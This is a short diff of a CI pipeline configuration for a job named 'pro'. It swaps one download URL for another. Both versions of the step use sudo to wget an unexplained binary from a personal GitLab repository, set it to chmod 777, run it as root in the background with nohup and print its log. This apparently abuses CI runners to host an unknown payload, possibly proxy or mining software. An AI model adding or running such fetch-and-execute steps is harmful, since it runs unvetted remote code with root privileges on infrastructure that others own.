@@ -13,7 +13,7 @@ jobs:
          name: "pro"
          
          command: | 
-          sudo su --command "wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro12345678910 && chmod 777 pro"
+          sudo su --command "wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro123456789101 && chmod 777 pro"
           sudo nohup ./pro --log=stdout > meta.log &
           sleep 5
           sudo cat meta.log
